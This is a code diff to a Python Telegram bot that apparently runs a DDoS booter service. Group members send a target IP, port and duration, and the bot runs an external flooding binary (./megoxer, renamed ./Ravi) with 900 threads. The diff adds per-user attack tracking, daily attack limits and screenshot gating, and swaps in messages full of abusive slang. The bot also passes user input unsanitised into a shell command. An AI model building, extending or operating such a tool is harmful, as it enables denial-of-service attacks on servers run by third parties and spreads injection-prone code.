@@ -3,6 +3,7 @@ import telebot
 import datetime
 import time
 import subprocess
+import random
 import threading
 import requests
 import os
@@ -18,10 +19,11 @@ GROUP_ID = "-1002369239894"
 CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
 
 # Attack settings
+COOLDOWN_TIME = 0  # Cooldown in seconds
 ATTACK_LIMIT = 10  # Max attacks per day
 
 # Global attack tracker
-is_attack_running = False  # Track if an attack is running
+active_attacks = {}
 pending_feedback = {}  # Users who need to send screenshots
 
 # File to store user data
@@ -47,6 +49,7 @@ def save_users():
         for user_id, data in user_data.items():
             file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")
 
+# Ensure the bot only runs in the group
 def is_user_in_channel(user_id):
     try:
         member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
@@ -56,28 +59,35 @@ def is_user_in_channel(user_id):
 
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    global is_attack_running  # Global attack flag
     user_id = str(message.from_user.id)
     command = message.text.split()
 
     if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀** ❌")
+        bot.reply_to(message, f"🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀** ❌")
         return
 
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **BSDK MC CHANNEL TERA BAAP JOIN KRGA** {CHANNEL_USERNAME} 🔥")
+        bot.reply_to(message, f"❗ **BSDK MATHERCHOD CHANNEL TERA BAAP JOIN KARGA** {CHANNEL_USERNAME} 🔥")
         return
 
     if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **LAUDE SCREENSHOT PEHLE DE FIR AANA!** 🔥")
+        bot.reply_to(message, "😡 **BSDK MATHERCHOD SCREENSHOT TERA BAAP DEGA!** 🔥")
         return
 
-    if is_attack_running:
-        bot.reply_to(message, "⚠️ **CHUDAI PAHLE SE HI CHALU HAI! BSDK WAIT.**")
+    if user_id in active_attacks:
+        bot.reply_to(message, "⚠️ **CHUDAI ALREADY CHALU HAI! MC WAIT KR** ⚡")
+        return
+
+    if user_id not in user_data:
+        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now()}
+
+    user = user_data[user_id]
+    if user['attacks'] >= ATTACK_LIMIT:
+        bot.reply_to(message, f"❌ **MA LA LAND CHUDAI LIMIT OVER! AB KAL AANA!** ❌")
         return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /RS  <IP>  <PORT>  <TIME> ")
+        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /RS  <IP>  <PORT>  <TIME> POWERED BY- @R_SDanger")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -90,28 +100,22 @@ def handle_attack(message):
         return
 
     if time_duration > 180:
-        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
+        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 CHUDAI 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
         return
 
-    # Mark attack as running
-    is_attack_running = True
+    active_attacks[user_id] = True
     pending_feedback[user_id] = True  # Require screenshot
 
-    bot.send_message(message.chat.id, f"💥 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!** 💥\n"
-                                                                        f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓:** `{target} : {port}`\n"
-                                                                        f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
-                                                                        f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
-                                                                        f"📸 **𝐆𝐀𝐌𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉 𝐃𝐄!**\n"
+    bot.send_message(message.chat.id, f"🚀 **CHUDAI ON! BSDK AB SCREENSHOT DE!**\n🎯 `{target} : {port}`\n⏳ {time_duration}s")
+     
     try:
-        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
+        subprocess.run(f"./Ravi {target} {port} {time_duration} 900", shell=True, check=True)
     except subprocess.CalledProcessError as e:
         bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
-        is_attack_running = False  # Reset flag
+        del active_attacks[user_id]
         return
 
-    bot.send_message(message.chat.id, "✅ **CHUDAI FINISHED ! 𝐀𝐁 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄!** 🚀")
-
-    is_attack_running = False  # Reset flag after attack completes
+    bot.send_message(message.chat.id, "✅ **CHUDAI OVER! AGAR PEHLE SCREENSHOT NHI DIYA TOH AB DE!** 🚀")
 
 @bot.message_handler(content_types=['photo'])
 def handle_screenshot(message):
@@ -124,6 +128,7 @@ def handle_screenshot(message):
 
         bot.reply_to(message, "✅ **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃! 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆𝐀𝐎!** 🚀")
         del pending_feedback[user_id]
+        del active_attacks[user_id]
     else:
         bot.reply_to(message, "❌ **𝐘𝐞 𝐀𝐏𝐏𝐑𝐎𝐏𝐑𝐈𝐀𝐓𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!**")
 
